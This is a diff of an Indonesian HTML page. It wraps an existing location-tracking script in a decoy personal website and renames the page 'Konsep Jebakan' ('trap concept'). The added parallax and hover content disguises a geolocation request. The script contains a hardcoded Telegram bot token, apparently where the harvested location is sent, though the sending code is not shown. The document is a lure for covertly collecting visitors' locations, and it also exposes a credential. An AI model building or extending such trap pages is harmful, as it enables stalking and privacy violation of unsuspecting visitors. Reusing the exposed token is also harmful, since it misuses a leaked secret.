@@ -2,11 +2,87 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Pelacak Lokasi</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Website Saya - Konsep Jebakan</title>
+  <style>
+    /* Parallax Background */
+    .parallax {
+      background-image: url('your-image.jpg'); /* Ganti dengan gambar latar belakang */
+      height: 100vh;
+      background-attachment: fixed;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-size: cover;
+    }
+
+    /* Konten Utama */
+    .content {
+      padding: 50px;
+      text-align: center;
+      background-color: rgba(255, 255, 255, 0.9);
+    }
+
+    /* Hover Efek */
+    .hover-box {
+      width: 300px;
+      height: 200px;
+      background-color: #ff6f61;
+      margin: 20px auto;
+      transition: all 0.3s ease;
+      cursor: pointer;
+    }
+
+    .hover-box:hover {
+      background-color: #4CAF50;
+      transform: scale(1.1);
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    }
+
+    .hidden-info {
+      display: none;
+      color: white;
+      font-size: 18px;
+      padding: 20px;
+      background-color: rgba(0, 0, 0, 0.7);
+    }
+
+    .hover-box:hover .hidden-info {
+      display: block;
+    }
+
+    /* Styling untuk status pelacakan */
+    #status {
+      font-size: 18px;
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
-  <h1>Halo, sedang melacak lokasi...</h1>
-  <p id="status">Meminta izin lokasi...</p>
+
+  <!-- Parallax Background -->
+  <div class="parallax"></div>
+
+  <!-- Konten Utama -->
+  <div class="content">
+    <h1>Selamat datang di Website Saya</h1>
+    <p>Scroll untuk melihat lebih banyak!</p>
+
+    <!-- Hover Box -->
+    <div class="hover-box">
+      <div class="hidden-info">
+        <p>Ini adalah informasi tersembunyi yang muncul saat hover!</p>
+      </div>
+    </div>
+
+    <p>Terus jelajahi website untuk menemukan lebih banyak konten tersembunyi!</p>
+
+    <!-- Pelacak Lokasi -->
+    <h1>Halo, sedang melacak lokasi...</h1>
+    <p id="status">Meminta izin lokasi...</p>
+  </div>
+
+  <!-- Parallax Background Lain -->
+  <div class="parallax"></div>
 
   <script>
     const token = "7716589580:AAHh-66I9FYbYLYjpcN2F40dHeoUYwUvWzk";
@@ -37,5 +113,6 @@
       document.getElementById("status").textContent = "Geolocation tidak didukung.";
     }
   </script>
+
 </body>
 </html>
